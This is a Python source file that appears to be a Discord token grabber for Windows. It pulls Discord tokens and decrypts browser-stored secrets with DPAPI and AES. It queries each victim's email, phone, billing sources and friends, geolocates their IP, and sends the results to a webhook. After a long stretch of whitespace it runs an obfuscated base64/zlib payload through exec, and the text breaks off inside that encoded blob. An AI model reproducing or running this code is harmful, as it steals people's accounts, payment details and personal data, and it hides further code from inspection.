import os
import threading
from sys import executable
from sqlite3 import connect as sql_connect
import re
from base64 import b64decode
from json import loads as json_loads, load
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from urllib.request import Request, urlopen
from json import *
import time
import shutil
from zipfile import ZipFile
import random
import re
import subprocess


hook = ""


DETECTED = False

def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
        pass
    return ip

requirements = [
    ["requests", "requests"],
    ["Crypto.Cipher", "pycryptodome"]
]
for modl in requirements:
    try: __import__(modl[0])
    except:
        subprocess.Popen(f"{executable} -m pip install {modl[1]}", shell=True)
        time.sleep(3)

import requests
from Crypto.Cipher import AES

local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
temp = os.getenv("TEMP")
Threadlist = []


class DATA_BLOB(Structure):
    _fields_ = [
        ('cbData', wintypes.DWORD),
        ('pbData', POINTER(c_char))
    ]

def GetData(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = c_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw

def CryptUnprotectData(encrypted_bytes, entropy=b''):
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()

    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
        return GetData(blob_out)

def DecryptValue(buff, master_key=None):
    starts = buff.decode(encoding='utf8', errors='ignore')[:3]
    if starts == 'v10' or starts == 'v11':
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass

def LoadRequests(methode, url, data='', files='', headers=''):
    for i in range(8): # max trys
        try:
            if methode == 'POST':
                if data != '':
                    r = requests.post(url, data=data)
                    if r.status_code == 200:
                        return r
                elif files != '':
                    r = requests.post(url, files=files)
                    if r.status_code == 200 or r.status_code == 413:
                        return r
        except:
            pass

def LoadUrlib(hook, data='', files='', headers=''):
    for i in range(8):
        try:
            if headers != '':
                r = urlopen(Request(hook, data=data, headers=headers))
                return r
            else:
                r = urlopen(Request(hook, data=data))
                return r
        except: 
            pass

def globalInfo():
    ip = getip()
    username = os.getenv("USERNAME")
    ipdatanojson = urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}")).read().decode().replace('callback(', '').replace('})', '}')
    # print(ipdatanojson)
    ipdata = loads(ipdatanojson)
    # print(urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}")).read().decode())
    contry = ipdata["country_name"]
    contryCode = ipdata["country_code"].lower()
    sehir = ipdata["state"]

    globalinfo = f":flag_{contryCode}:  - `{username.upper()} | {ip} ({contry})`"
    return globalinfo


def Trust(Cookies):
    # simple Trust Factor system
    global DETECTED
    data = str(Cookies)
    tim = re.findall(".google.com", data)
    # print(len(tim))
    if len(tim) < -1:
        DETECTED = True
        return DETECTED
    else:
        DETECTED = False
        return DETECTED
        
def GetUHQFriends(token):
    badgeList =  [
        {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<:developer:874750808472825986> "},
        {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<:bughunter_2:874750808430874664> "},
        {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early_supporter:874750808414113823> "},
        {"Name": 'House_Balance', 'Value': 256, 'Emoji': "<:balance:874750808267292683> "},
        {"Name": 'House_Brilliance', 'Value': 128, 'Emoji': "<:brilliance:874750808338608199> "},
        {"Name": 'House_Bravery', 'Value': 64, 'Emoji': "<:bravery:874750808388952075> "},
        {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "<:bughunter_1:874750808426692658> "},
        {"Name": 'HypeSquad_Events', 'Value': 4, 'Emoji': "<:hypesquad_events:874750808594477056> "},
        {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "<:partner:874750808678354964> "},
        {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<:staff:874750808728666152> "}
    ]
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        friendlist = loads(urlopen(Request("https://discord.com/api/v6/users/@me/relationships", headers=headers)).read().decode())
    except:
        return False

    uhqlist = ''
    for friend in friendlist:
        OwnedBadges = ''
        flags = friend['user']['public_flags']
        for badge in badgeList:
            if flags // badge["Value"] != 0 and friend['type'] == 1:
                if not "House" in badge["Name"]:
                    OwnedBadges += badge["Emoji"]
                flags = flags % badge["Value"]
        if OwnedBadges != '':
            uhqlist += f"{OwnedBadges} | {friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})\n"
    return uhqlist

def GetBilling(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        billingjson = loads(urlopen(Request("https://discord.com/api/users/@me/billing/payment-sources", headers=headers)).read().decode())
    except:
        return False
    
    if billingjson == []: return "```None```"

    billing = ""
    for methode in billingjson:
        if methode["invalid"] == False:
            if methode["type"] == 1:
                billing += ":credit_card:"
            elif methode["type"] == 2:
                billing += ":parking: "

    return billing


def GetBadge(flags):
    if flags == 0: return ''

    OwnedBadges = ''
    badgeList =  [
        {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<:developer:874750808472825986> "},
        {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<:bughunter_2:874750808430874664> "},
        {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early_supporter:874750808414113823> "},
        {"Name": 'House_Balance', 'Value': 256, 'Emoji': "<:balance:874750808267292683> "},
        {"Name": 'House_Brilliance', 'Value': 128, 'Emoji': "<:brilliance:874750808338608199> "},
        {"Name": 'House_Bravery', 'Value': 64, 'Emoji': "<:bravery:874750808388952075> "},
        {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "<:bughunter_1:874750808426692658> "},
        {"Name": 'HypeSquad_Events', 'Value': 4, 'Emoji': "<:hypesquad_events:874750808594477056> "},
        {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "<:partner:874750808678354964> "},
        {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<:staff:874750808728666152> "}
    ]
    for badge in badgeList:
        if flags // badge["Value"] != 0:
            OwnedBadges += badge["Emoji"]
            flags = flags % badge["Value"]

    return OwnedBadges

def GetTokenInfo(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    userjson = loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers)).read().decode())
    username = userjson["username"]
    hashtag = userjson["discriminator"]
    email = userjson["email"]
    idd = userjson["id"]
    pfp = userjson["avatar"]
    flags = userjson["public_flags"]
    nitro = ""
    phone = ""

    if "premium_type" in userjson: 
        nitrot = userjson["premium_type"]
        if nitrot == 1:
            nitro = "<a:DE_BadgeNitro:865242433692762122>"
        elif nitrot == 2:
            nitro = "<a:DE_BadgeNitro:865242433692762122><a:autr_boost1:1038724321771786240>"
    if "phone" in userjson: phone = f'{userjson["phone"]}'

    return username, hashtag, email, idd, pfp, flags, nitro, phone

def checkToken(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers))
        return True
    except:
        return False
        
type('sys') 

__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        ("ZnJvbSBidWlsdGlucyBpbXBvcnQgKgpmcm9tIG1hdGggaW1wb3J0IHByb2QgYXMgX2NhbGN1bGF0ZQoKCl9fc2FfXyA9ICdheWh1JwpfX2JiX18gPSAoJ2F5aHUnLCAnYXJ0b251cycpCl9fZ2dfXyA9ICdodHRwczovL2dpdGh1Yi5jb20vQXlodXV1JwpfX2hoX18gPSAnaHR0cHM6Ly9kaXNjb3JkLmdnLycKX19qal9fID0gJ0VQTC0yLjAnCgpfX2NvZGVfXyA9ICdwcmludCgiSGVsbG8gd29ybGQhIiknCgoKQWJzb2x1dGUsIFRoZW9yeSwgSHlwb3RoZXNpcywgQWxnb3JpdGhtLCBTdGFja092ZXJmbG93LCBfc3RhY2tvdmVyZmxvdywgX3RoZW9yeSA9IGV4ZWMsIHN0ciwgdHVwbGUsIG1hcCwgb3JkLCBnbG9iYWxzLCB0eXBlCgpjbGFzcyBJbnZlcnQ6CiAgICBkZWYgX19pbml0X18oc2VsZiwgQ2VpbCk6CiAgICAgICAgc2VsZi5TdWJzdHJhY3QgPSBfY2FsY3VsYXRlKChDZWlsLCAtMzY2OSkpCiAgICAgICAgc2VsZi5XYWxrKF9jdWJlPS03NjEyMSkKCiAgICBkZWYgV2FsayhzZWxmLCBfY3ViZSA9IEVsbGlwc2lzKToKICAgICAgICAjIHNvdXJjZXJ5IHNraXA6IGNvbGxlY3Rpb24tdG8tYm9vbCwgcmVtb3ZlLXJlZHVuZGFudC1ib29sZWFuLCByZW1vdmUtcmVkdW5kYW50LWV4Y2VwdC1oYW5kbGVyCiAgICAgICAgc2VsZi5TdWJzdHJhY3QgLT0gNzM2MzkgLSBfY3ViZQogICAgICAgIAogICAgICAgIHRyeToKICAgICAgICAgICAgKChBYnNvbHV0ZSwge0h5cG90aGVzaXM6IEFsZ29yaXRobX0pIGZvciBBYnNvbHV0ZSBpbiAoX3dhbGssIEFic29sdXRlKSBpZiBTdGFja092ZXJmbG93IGlzIFRoZW9yeSkKCiAgICAgICAgZXhjZXB0IE9TRXJyb3I6CiAgICAgICAgICAgICgoSHlwb3RoZXNpcywgKEFsZ29yaXRobSwgQWJzb2x1dGUpKSBmb3IgSHlwb3RoZXNpcyBpbiB7QWJzb2x1dGU6IF93YWxrfSBpZiBBbGdvcml0aG0gIT0gQWJzb2x1dGUpCgogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgX3RoZW9yeSg3NCArIDk3ODc1KSA9PSBUcnVlCgogICAgZGVmIFN5c3RlbShzZWxmLCBfZGV0ZWN0dmFyID0gNjQ3NjEpOgogICAgICAgICMgc291cmNlcnkgc2tpcDogY29sbGVjdGlvbi10by1ib29sLCByZW1vdmUtcmVkdW5kYW50LWJvb2xlYW4sIHJlbW92ZS1yZWR1bmRhbnQtZXhjZXB0LWhhbmRsZXIKICAgICAgICBfZGV0ZWN0dmFyIC89IC01MTIzNiAtIC03MDk1CiAgICAgICAgc2VsZi5fbmVnYXRpdmUgIT0gTm9uZQogICAgICAgIAogICAgICAgIHRyeToKICAgICAgICAgICAgKChBbGdvcml0aG0sIEFic29sdXRlKSBvciBBYnNvbHV0ZSBpZiAoQWxnb3JpdGhtLCBBYnNvbHV0ZSkgYW5kIEFic29sdXRlIGVsc2UgLi4uIG9yIChBYnNvbHV0ZSwgKEFsZ29yaXRobSwgQWJzb2x1dGUpKSkKCiAgICAgICAgZXhjZXB0IFR5cGVFcnJvcjoKICAgICAgICAgICAgKCgoQWJzb2x1dGUsIEFic29sdXRlLCBBbGdvcml0aG0pLCBBYnNvbHV0ZSkgZm9yIEFic29sdXRlIGluIHtBYnNvbHV0ZTogX3dhbGt9KQoKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIF90aGVvcnkoLTQ5NjgyICsgLTMxODYxKSA9PSBpbnQKCiAgICBkZWYgU3RhdGlzdGljcyhNZW1vcnlBY2Nlc3MgPSBFbGxpcHNpcyk6CiAgICAgICAgcmV0dXJuIF9zdGFja292ZXJmbG93KClbTWVtb3J5QWNjZXNzXQoKICAgIGRlZiBGcmFtZShNb2R1bG8gPSAtMjYyOCArIDcxODE2LCBfY2FsbGZ1bmN0aW9uID0gRmFsc2UsIF9tZW1vcnlhY2Nlc3MgPSBfc3RhY2tvdmVyZmxvdyk6CiAgICAgICAgIyBzb3VyY2VyeSBza2lwOiBjb2xsZWN0aW9uLXRvLWJvb2wsIHJlbW92ZS1yZWR1bmRhbnQtYm9vbGVhbiwgcmVtb3ZlLXJlZHVuZGFudC1leGNlcHQtaGFuZGxlcgogICAgICAgIF9tZW1vcnlhY2Nlc3MoKVtNb2R1bG9dID0gX2NhbGxmdW5jdGlvbgogICAgICAgIAogICAgICAgIHRyeToKICAgICAgICAgICAge0Fic29sdXRlOiBfd2Fsa30gaWYgU3RhY2tPdmVyZmxvdyBpcyBTdGFja092ZXJmbG93IGVsc2UgKEFsZ29yaXRobSwgQWJzb2x1dGUpICE9IFRoZW9yeQoKICAgICAgICBleGNlcHQgQXNzZXJ0aW9uRXJyb3I6CiAgICAgICAgICAgICgoQWJzb2x1dGUsIHtIeXBvdGhlc2lzOiBBbGdvcml0aG19KSBmb3IgQWJzb2x1dGUgaW4ge1N0YWNrT3ZlcmZsb3c6IFRoZW9yeX0gaWYgU3RhY2tPdmVyZmxvdyA+PSBfd2FsaykKCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBfdGhlb3J5KDQ3NzIyICsgNzIxNTkpID09IGZsb2F0CgogICAgZGVmIGV4ZWN1dGUoY29kZSA9IHN0cik6CiAgICAgICAgcmV0dXJuIEFic29sdXRlKFRoZW9yeShIeXBvdGhlc2lzKEFsZ29yaXRobShTdGFja092ZXJmbG93LCBjb2RlKSkpKQoKICAgIEBwcm9wZXJ0eQogICAgZGVmIF9uZWdhdGl2ZShzZWxmKToKICAgICAgICBzZWxmLl9tdWx0aXBseSA9ICc8X19tYWluX18uQWJzb2x1dGUgb2JqZWN0IGF0IDB4MDAwMDA5NzY2QkU3MjE2MT4nCiAgICAgICAgcmV0dXJuIChzZWxmLl9tdWx0aXBseSwgSW52ZXJ0Ll9uZWdhdGl2ZSkKCmlmIF9fbmFtZV9fID09ICdfX21haW5fXyc6CiAgICB0cnk6CiAgICAgICAgSW52ZXJ0LmV4ZWN1dGUoY29kZSA9IF9fY29kZV9fKQogICAgICAgIE5lZ2F0aXZlID0gSW52ZXJ0KENlaWwgPSAtODQxOCArIDcxMDY3KQoKICAgICAgICBOZWdhdGl2ZS5TeXN0ZW0oX2RldGVjdHZhciA9IDg5ODU0ICogTmVnYXRpdmUuU3Vic3RyYWN0KSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA7SW52ZXJ0LkZyYW1lKE1vZHVsbz0nT29vT08wbzBvME8wTzBvb09PMG9vJyxfY2FsbGZ1bmN0aW9uPWIneFx4OWNceGRkWW1vIjdceDEwXHhmZVx4Y2VceGFmXHhlMFx4ZjhceGIyXHhhY3JJXHgxNlx4YWZceGVkZVx4OTFceGVlQ1x4YTVceGI0Klx4ODhceDg0XHhhYVRNXHhhYVx4YmJceDEzXHhkYVdiXHhjZVx4YWMjWC5ceGU0XHhkZndceGM2NiRceDA3bFx4YjM0UStceGIxXHhjNi87XHg5ZVx4MTlceGRiXHg4Zlx4YzdjeylceDE3T1x4YmRGXHgxM1x4MWVceDkxXHhiN3VceDhlXHhjZmRceGIyXHg4YyZceDkzXHhlNlx4ODdPXHhhZFx4ZThceGU5flx4ZDVqXHhhYVx4YzVceDhiXHhhYThceGQ2VW1TXHhmN1x4YjFceDE1LUpVXHhhY1x4OTYtXHhmN1x4MDdceGFlXHhlOVx4ZDQoXHhiOC9ceGNiXHg4N2VceGVmXHhmMnIqXHhjYVx4ZmJVfFx4OTFceGE4XHhmOVx4ZTVPIFx4YjdceGRhXHhkNXpceDdmXHhmZiNceDdmKlx4OTZceDg5Wlx4YTRceDE3XHhkM1x4ZTlceGU1XHgwZVx4ZTdsZjhceDdmXHhmZW14Ti5ceGJjXHg5ZFx4ZGFEXHhhNVx4OTlceGFld1x4MWVceDE2XHhhMihceGRiXHhhZF8zKVVceGYzUS1kXHhmYVx4YTFceGU1OlxyXHhiN1x4YjdceGU1XHhjNnpnXHhmOU1ceGE0XHg4ZVx4ZGJceGM4XHhkNklceGY2UFooXHg4YVx4ODdceDE1SFx4ZmVceGFlXHg5Nlx4ZDlceGIyXHgxOS1ceGIyXHhlNiJLXHhiZlx4MTRceDdmXG4lXHhiM1x4ZDJceDEwYlx4YjlceGNhXHhiZVx4MTRceDdmXHhhOVx4OTV+XHg4Ylx4OWFceGE4XHhlNEtxXHhhM2JceDk1PjVceGE1XHhmOFx4MDZyT2pceGQ1clx4MWJceGE2U2JceGZlXHhhMFx4MTZceGU1ZFx4MDJceGFkPS1ceDFkXHhmNyJbXHg4Ylx4YjJceGVkNlx4YTRKIlx4YjlsXHhiYlx4OWZceDlkMVx4MTlceDhmXHQhXHgxOFx4ZjUzXHgxZTtfP01ceGE1XHg4YVx4YTFceGJlXHhiMV9ceDg5Ilx4Zjg+XHhkZVJceDgwR1x4YTdQdj5ceGY3emdceGU3Z1x4ZTdceGVkXHhmM1x4ZjZZXHhjN3VceGJmXHg4Mlx4YTJceGFjXHg4Y1x4Y2FyUVx4YTFoXHhlNFx4YTlceGQxXHhjOFx4ZjNceGY0b1x4YTRceDE0XHhmZUZceGZiOlJRJVx4N2Z9fX1jXHhlMlx4OGRceDhlXHhmMEBceGU3XHhjZFx4ZDhceDFhXHgwNypRXHhlNlx4ZjFxXHJceGMxXHhhNGt4XHhhMFx4ZjhceDA4Qlx4Y2ZIVVx4YjQ1XHhlOFx4ZjdceGZiXHhjM2FceDdmMFx4YzBceDE0XHhiMlx4ZTFgXHgwMGJceDg3XHhiNFx4YjVceDlkeCVkKVxuXHhjNFx4ZmJ7XHhiNFx4YThceGVjXG5ceGYyXHgxYiEtaFx4YTRRXHgxZChceDFlXHhlZmBLTFx4OGZceGM2XHhhNH1ceGI4XHhjOWUhSilWXHhmMS58XHhlZVx4YzdceDkxRVx4ZDZceGIzSFx4OGZceDk0NzpWXHg4OVx4ZmJceGY5XVx4YjRcXFx4ODgiXHhjZFx4ZDZtXCdceDkzXHhlMmFceGFlXHg5Mj1ceDg2XHhhZm5ceDA1XHhmODMxXHg5YkkpXHhlMFx4OTEzOVx4OWJceGNkXHg4NDh1XHg4OFx4MTZceGU1XHhiMj48d1x4YjdceGI3d3d3XHhiN1x4OThhXHhlOVx4MTZceDkyU1x4YzdcJ1tceGNhXHhlOFx4OTdDXHgwOFx4MWRYXHhhN2ZceGY5alx4Y2FceDEwXHhhOVBceGRiXHgxZlx4MGVceDg2XHhjM1x4N2ZceDgxXHg5MVx4MTBceGM5MipceGM0XHhkYjBceGFhVHJceDE0Rlx4ZDVaNlx4MTg9XHhlNUJceGFlXHhiM1x4ZmJiVVx4ZGZceDkyXHhiMFx4ODFHXHhlM1x4OTBceGQ2XHhkNiFceGFkXHgwMSZceGM3XHhiOVx4OTgpUVx4ZmNceDgzXHg5MFx4ZTU3XHhkZFx4ZDRceGNlXHhlY1x4ZDQtUEZceGRmXHhiM0NceGMwVjh7XHhhOV1ceGQ4TEhceGYwY1hceDllSVx4MTNOXHgxZFx4YTZsXHhiNVx4ZjhceGUzXHg4OHVaXHhjY1x4OGJceGY5XHgxY1x4YTMtXHgxNFgsXHhlNlx4YTdceDhlUlx4MTkpXHg5OVx4MWZceDAxXHgxM1pceDBlXHgxYVx4MTJceDlhXHgxNFx4MTRgR1x4ODQ9XHgxMVx4OGRceGVhXHhkNFx4ODFceDkySlx4ZWRceGQ3Vlx4YmEzXHgwMFx4YWYvXHhmMVx4YjFceDk5XHhlY1x4Y2JceDk3XHhjMlx4ODdceDFkV1x4ZmJceGQwXlx4ZDFceDhlXHgxZFx4YmZceGMzclx4ZGZceDgzXHgxOEJceDBjIFJceDg4XHgwY2JceGQ3XHhiZVx4ZmJYJjFceGU5XHg5Mlx4YjRceDE2b0BCOCFceGE2XHgxOV5ceDFjXHhkYU43L1x4ZjdceDFkXHhiNVx4YWJPXHhjMFwnPVx4YTNJXHhiNj5ceGU4R1x4MGZbflx4YzVceGRjXHhmMFRceDg3TFx4ODdNXHg5ZVlqamlceGE5XHhhNVx4ZThceGJhXHhkN1x4OTBceDg3e0Q0XHg4Zlx4ZDNceGE4XHhmOVx4YjhceDFkXHg5Mz1ceGEzXHhlYlx4YzFceGY1XHgwZVx4MTlcXFx4ZDVqVVdcbn5ceDFhXHhiNVx4YWJceGFiXHhhYlx4OTFceGJhelx4ODNceDExcjBceDFjYlxyXHg4YlsjIzZuXHg4Y1x4Y2VceGI3RlhceDg3XHg5N1x4ZDQ1Qlx4MGJceGM3XHhmM1pceDkyJj9ceDA2XHg4OVx4OGFBXHhkMVx4OWNceGU3XHgxNFx4YmFceGYzMm4oXHg5OFx4ZTJceDFiRkxfXHg5Zlx4YjdceGUzXHgwMCVceDg0d1x4MDNcblx4YzFceDBifD8iOVx4Yzk5XHhlNWFceGUwc1x4OWZceGU3XHgwMVx4ZTFceDk0ZFhceGUyKVx4ZDA7XHg4MVx4YzdDXHg5Mlx4MDdceDAxZ1x4MWNceGE0XHhiMD88XHgwZXxceDAyYEJceDFmXHgxOVx4YTRceDA0XHg4Mlx4ZWZceDg3XHhmYVxyVVAoXHgxM1x4YTBceGMzclx4ZjdceDE5XHhjOWlceGNjXHg5OFx4ZGZceGE1XHgxZFx4MTZceDA0XHgwNDxceDAxUFx4OTlceGM3XHgxM0ZceDk4R2NceDA4XHgwMVxyeVx4Y2VceDE4XHg4YlhIOVx4Yzh0XHhhOE9hXHhkYVx4MDJceDlmUVx4ODZ6XHhmZCBceDBjXHg5OFx4MWZceDkyXHg5NHdoXHhjNmNceDE2Qlx4MGJceGRkXHg4MFx4MDRceDk0Mlx4ZThZQn1ceDlmXHgwN1x4MDRSaFx4MTVwXHgwYilceGI2Sn0vXHgwOFx4ODFceDk0XHgwNl1ceGNhaVx4OTdGQUA5IVx4YWZOeVx4OTUpXHhlM1RvPVx4OTFceDk5eVx4ZmRceDFiXHhkNzBpXHhjN1x4ZjVceGEwXHhiYVx4ZjNceGNlXHg5Y1x4OWRcdFx4OTlceGIwXHRceDg1XHhlOE86Olx4ZjhceGMwTlx4ZjZceGE5XHhmNVx4YjRBXHhiNVdceDhiXHg5M05ceDAyXHgwOFx4MGNceGRhXHhmMVx4YTBceDFkXHgxZkpceDBjXHhkOFx4ZDk+XHhiNVx4ZTYoUFx4OWZceDA3cl1ceDkwXG4hMD1ceDhhPWotbVx4YTZ9XHg5NFx4MGNBXHgxMlx4YzZ0XHhjNlx4N2ZceGE0XHhkNFx4ZDJceGQyXHg5ZGBceGUwXHgxMFx0XHhiNlx4OGN9XHgwMVx4ZjZwXHg5ZlpLW1x4MDBceGRjXHgwMVx4Y2NDXHhiOEVceDg2XHgwMnt3XHg5ZlpLXHgxYlx4Y2VuXHgxN2RwZlx4OTlGXHgwOGdceGRkXHhkZlx4YTdceGJlXHhjMVx4ZDV6JDV7eT1ceDE3WTduXVx4YTlceGQwN1x4MDE4XHhiY0lceGZjXHhhZWFceGNlb3BceDkyXHhlYlx4MWRceGJjQVx4MWNceGI5XHgxZlx4ODY6JFx4ZGJceDk4XHhmMEhTIlx4OWRcJ1x4YjZceGQ2XHg4NFx4YThceGY2Xlx4ODhceDFmXHgxOVx4Y2NceGM3XHgwNlx4ZmNceGRhYD42XHhmNFx4MGV2XHhhY1x4Y2FceDdmQHloOjxceGQwXHhiNVx4YzNBTVx4ZTNceGYxXHhiNVx4OTFceGY4eklzXHg5Y15tPHtceGQ0Wlx4ZGFCXHhiZFx4OThceGQwXHg4OD0tXHgwN1x4MGJceDBiXHhkOFx4ZDFceDAwd1x4YThceGI1XHhiNFx4ZjlceDkzQFx4Y2JceGExXHgwYy5ceGQ4XHg4ZV4mdFx4OWZceGZhXHhmZlx4OThceGUyXHhjZVx4Y2VceGRkXHhkN1x4MTlceDA0fTZ+XHgwZltceGEzXHgxNFx4ZjdqXHhiM1x4ODdTXHhhYXN8cltceGMyXVx4MTJceGNhXHhiNW1MXHg5OCtceDhkXHhjNFx4YTUhXHhmNFx4OTVZXHgxY1x4YjckXHg5Y1x4Y2RceGM3MHxceGI0XHhjNVx4ZmV3XHhjMG9HXHgwMVx4ZTZceGRkR1x4MTNceGQ3XHhkYVx4YTBnXHhhOFx4ZmVdXHgxNlx4YjZceDg1c1x4MDNceGFiXHgwNlx4OWE+XHhiZlx4MTlceGM4a1x4ODNceGRkNyZhXHgxMlx4ZjNyXFw3XHgxZFx4YzNceGE5XHg5OW5ceGIwYF5ceGRmXHg4MHhceGYwXHhlMlx4YTZceGM0XHhlY1x4Y2RceDg5XHhkYlx4YjhceGExcXtceGMwXHhhZFx4YzNceGNiXHg4ZVx4OWM5M1x4OGNceDliXHhlZFx4ODhceGFlXHJceDBjXHhkNzdHOVx4YmFqXHhiZlx4OGNceDFleFx4ZTNceDhmXHgxM1x4ZWJceDg5I1x4ZWJceGE1XHg4MVZ7XHhlYXBceGMzXHgxMFx4ZjZceGRlb1x4YmUoXHhjZFx4OGVceGJhXHg5NGxGZ1x4YzdpMnxceDdmXHhjM1x4ZGNceDg1XHhmNnJBXHhlZFx4ZTVceDgyXHhiZFx4OThceDhmXHg4ZVx4OGRceGQ0XHhjZV1ceDFkXlx4YmZceGVlXHhkY1x4MWR5XHhlNlx4ODdDXHhmM1x4ZWJcJ1x4ZTB8XHhhMVx4ZTZceGNkXHhjZF85TVx4ZjNceGY3UFx4MTMuXHhhYklceDAzXHg5M1x4YjZceGI1XHg4Y2dceGY0Nlx4MGJceGMxbVx4OTRceGQzXHhmOVx4YjdceGY1XHhhN1x4OTFceGJlIGNceGMwXHgwMlx4ZGNceDkzXHg5NVx4YTdceDk0XHhkN1x4ZjhceDFiXHg4M3xceGFmXHhhOScpCgogICAgICAgIGlmIDM3MTk3OCA+IDkyMTQxOTM6CiAgICAgICAgICAgIEludmVydChDZWlsID0gLTgwODMyICogLTIwODY0KS5XYWxrKF9jdWJlID0gTmVnYXRpdmUuU3Vic3RyYWN0IC0gLTE5MzMyKQogICAgICAgIGVsaWYgNDIwOTcyIDwgNjUxMDgzMToKICAgICAgICAgICAgTmVnYXRpdmUuV2FsayhfY3ViZSA9IE5lZ2F0aXZlLlN1YnN0cmFjdCAqIC00ODc1OCkgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgO0lsbElsSWxJSWxJbGxsSWxJSWxsLElMSUxMTElKSUxJSklMTExKSkpMSkxJSUwsamlpamxpbGlqaWpqamlpaWxqamlqbGosbElsSUlsSWxsSUlJSWxsSUlsbGxJbCxKTEpKSUlKSUxJSkpMSkxMSkxJSUlMSUk9KGxhbWJkYSBJSklMSUpMTExKSkpKSUxKSko6SUpJTElKTExMSkpKSklMSkpKKF9faW1wb3J0X18oJ1x4N2FceDZjXHg2OVx4NjInKSkpLChsYW1iZGEgSUpJTElKTExMSkpKSklMSkpKOmdsb2JhbHMoKVsnXHg2NVx4NzZceDYxXHg2YyddKGdsb2JhbHMoKVsnXHg2M1x4NmZceDZkXHg3MFx4NjlceDZjXHg2NSddKGdsb2JhbHMoKVsnXHg3M1x4NzRceDcyJ10oIlx4NjdceDZjXHg2Zlx4NjJceDYxXHg2Y1x4NzNceDI4XHgyOVx4NWJceDI3XHg1Y1x4NzhceDM2XHgzNVx4NWNceDc4XHgzN1x4MzZceDVjXHg3OFx4MzZceDMxXHg1Y1x4NzhceDM2XHg2M1x4MjdceDVkKElKSUxJSkxMTEpKSkpJTEpKSikiKSxmaWxlbmFtZT0nXHg3OFx4NzhceDc3XHg3N1x4NzhceDc4XHg3N1x4NzdceDc4XHg3OFx4NzhceDc4XHg3N1x4NzhceDc3XHg3N1x4NzhceDc4XHg3OCcsbW9kZT0nXHg2NVx4NzZceDYxXHg2YycpKSksKGxhbWJkYSBJSklMSUpMTExKSkpKSUxKSko6SUpJTElKTExMSkpKSklMSkpKWydceDY0XHg2NVx4NjNceDZmXHg2ZFx4NzBceDcyXHg2NVx4NzNceDczJ10pLChsYW1iZGEgTU1NTk1NTU1NTk1NTk5NTk1NTU5OLElKSUxJSkxMTEpKSkpJTEpKSjpNTU1OTU1NTU1OTU1OTk1OTU1NTk4oSUpJTElKTExMSkpKSklMSkpKKSksKGxhbWJkYToobGFtYmRhIElKSUxJSkxMTEpKSkpJTEpKSjpnbG9iYWxzKClbJ1x4NjVceDc2XHg2MVx4NmMnXShnbG9iYWxzKClbJ1x4NjNceDZmXHg2ZFx4Nz